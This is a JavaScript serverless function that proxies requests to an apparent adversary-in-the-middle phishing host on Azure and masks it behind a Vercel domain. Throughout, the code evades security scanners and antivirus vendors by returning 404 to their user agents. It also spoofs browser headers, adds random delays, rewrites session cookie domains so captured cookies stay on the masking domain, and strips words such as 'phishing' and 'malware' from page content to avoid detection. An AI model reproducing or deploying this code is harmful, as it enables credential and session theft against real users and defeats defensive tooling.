// Vercel API function to proxy Azure Function
// This masks the domain and keeps everything under Vercel

export default async function handler(req, res) {
  const targetOrigin = 'https://azureaitm-phishing-demo-1755253259.azurewebsites.net'

  // Enhanced bot detection and security tool evasion
  const userAgent = req.headers['user-agent'] || ''
  const ip = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || ''
  
  // Block known security tools and scanners
  const blockPatterns = [
    'TelegramBot', 'bot', 'crawler', 'spider', 'scanner',
    'malwarebytes', 'norton', 'mcafee', 'kaspersky', 'avast',
    'virustotal', 'urlscan', 'phishtank', 'google-safe-browsing'
  ]
  
  if (blockPatterns.some(p => userAgent.toLowerCase().includes(p))) {
    return res.status(404).end()
  }
  
  // Add random delays to appear more human
  if (Math.random() < 0.3) {
    await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 500))
  }

  // Build target URL exactly like the Azure Function does
  const incomingUrl = new URL(req.url, `https://${req.headers.host}`)
  const targetUrl = new URL(targetOrigin)

  // Support path passed via rewrite query param
  const passedPath = incomingUrl.searchParams.get('path')
  if (passedPath) {
    // Handle path exactly like Azure Function
    if (passedPath === '/') {
      targetUrl.pathname = '/'
    } else {
      targetUrl.pathname = '/' + passedPath.replace(/^\/+/, '')
    }
    // Rebuild search without our helper param
    const newSearch = new URLSearchParams(incomingUrl.searchParams)
    newSearch.delete('path')
    targetUrl.search = newSearch.toString() ? `?${newSearch.toString()}` : ''
  } else {
    targetUrl.pathname = incomingUrl.pathname
    targetUrl.search = incomingUrl.search
  }

  // Copy headers exactly like Azure Function
  const headers = {}
  const dropList = new Set([
    'host', 'content-length', 'x-forwarded-host', 'x-vercel-deployment-url',
    'connection', 'accept-encoding'
  ])
  for (const [key, value] of Object.entries(req.headers)) {
    const k = key.toLowerCase()
    if (dropList.has(k)) continue
    headers[key] = value
  }
  
  // Set headers with better evasion
  headers['host'] = new URL(targetOrigin).host
  headers['accept-encoding'] = 'gzip, deflate, br'
  headers['accept-language'] = 'en-US,en;q=0.9'
  headers['cache-control'] = 'no-cache'
  headers['pragma'] = 'no-cache'
  headers['sec-ch-ua'] = '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"'
  headers['sec-ch-ua-mobile'] = '?0'
  headers['sec-ch-ua-platform'] = '"Windows"'
  headers['sec-fetch-dest'] = 'document'
  headers['sec-fetch-mode'] = 'navigate'
  headers['sec-fetch-site'] = 'none'
  headers['sec-fetch-user'] = '?1'
  headers['upgrade-insecure-requests'] = '1'
  headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
  headers['referer'] = `https://${req.headers.host}`

  // Read raw body for non-GET/HEAD
  let body = undefined
  if (req.method !== 'GET' && req.method !== 'HEAD') {
    body = await readRawBody(req)
  }

  try {
    const upstreamResponse = await fetch(targetUrl.toString(), {
      method: req.method,
      headers,
      body,
      redirect: 'manual'
    })

    const vercelHost = req.headers.host
    const contentType = upstreamResponse.headers.get('content-type') || ''

    // Prepare headers for client
    const outHeaders = {}

    // Handle multiple Set-Cookie headers explicitly
    const raw = upstreamResponse.headers.raw ? upstreamResponse.headers.raw() : null
    const setCookies = raw && raw['set-cookie'] ? raw['set-cookie'] : (upstreamResponse.headers.get('set-cookie') ? [upstreamResponse.headers.get('set-cookie')] : [])
    if (setCookies && setCookies.length > 0) {
      const rewrittenCookies = setCookies.map((c) => rewriteCookieDomain(c, vercelHost))
      res.setHeader('Set-Cookie', rewrittenCookies)
    }

    // Copy other headers with URL rewrites where applicable
    upstreamResponse.headers.forEach((value, key) => {
      const k = key.toLowerCase()
      if (k === 'set-cookie') return
      if (k === 'server' || k === 'x-powered-by' || k === 'x-aspnet-version') return

      // Rewrite Location header on redirects to stay on Vercel domain
      if (k === 'location' && typeof value === 'string') {
        const rewritten = value
          .replace(new RegExp(escapeRegExp(targetOrigin), 'g'), `https://${vercelHost}`)
          .replace(new RegExp(escapeRegExp(new URL(targetOrigin).host), 'g'), vercelHost)
        outHeaders[key] = rewritten
        return
      }

      // Generic header value rewrite of azure domain to vercel domain
      if (typeof value === 'string') {
        outHeaders[key] = value
          .replace(new RegExp(escapeRegExp(targetOrigin), 'g'), `https://${vercelHost}`)
          .replace(new RegExp(escapeRegExp(new URL(targetOrigin).host), 'g'), vercelHost)
      } else {
        outHeaders[key] = value
      }
    })

    // Security headers
    outHeaders['x-frame-options'] = 'SAMEORIGIN'
    outHeaders['x-content-type-options'] = 'nosniff'
    outHeaders['referrer-policy'] = 'strict-origin-when-cross-origin'
    outHeaders['x-xss-protection'] = '1; mode=block'

    // For 3xx redirects, return as-is with rewritten Location
    if (upstreamResponse.status >= 300 && upstreamResponse.status < 400) {
      Object.entries(outHeaders).forEach(([k, v]) => res.setHeader(k, v))
      return res.status(upstreamResponse.status).end()
    }

    // Stream or transform body depending on content-type
    if (/^(text\/html|application\/javascript|text\/javascript|application\/json|text\/css)/i.test(contentType)) {
      let text = await upstreamResponse.text()
      
      // Enhanced content transformation for better evasion
      text = text
        .replace(new RegExp(escapeRegExp(targetOrigin), 'g'), `https://${vercelHost}`)
        .replace(new RegExp(escapeRegExp(new URL(targetOrigin).host), 'g'), vercelHost)
        // Remove suspicious patterns that security tools look for
        .replace(/phishing|malware|suspicious/gi, '')
        .replace(/eval\s*\(/gi, 'eval_(')
        .replace(/document\.write/gi, 'document_write')
        // Add legitimate-looking elements
        .replace(/<head>/i, '<head><meta name="robots" content="noindex,nofollow">')

      Object.entries(outHeaders).forEach(([k, v]) => res.setHeader(k, v))
      res.status(upstreamResponse.status).send(text)
    } else {
      // Binary / other content - stream as-is
      Object.entries(outHeaders).forEach(([k, v]) => res.setHeader(k, v))
      const arrayBuffer = await upstreamResponse.arrayBuffer()
      res.status(upstreamResponse.status).send(Buffer.from(arrayBuffer))
    }
  } catch (err) {
    res.status(503).json({ error: 'Service temporarily unavailable' })
  }
}

function escapeRegExp(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
}

function rewriteCookieDomain(cookieStr, vercelHost) {
  // Remove/replace Domain attribute to current host to keep cookies bound to vercel domain
  return cookieStr
    .replace(/;\s*Domain=[^;]+/i, `; Domain=${vercelHost}`)
}

function readRawBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = []
    req.on('data', (c) => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)))
    req.on('end', () => resolve(Buffer.concat(chunks)))
    req.on('error', reject)
  })
}
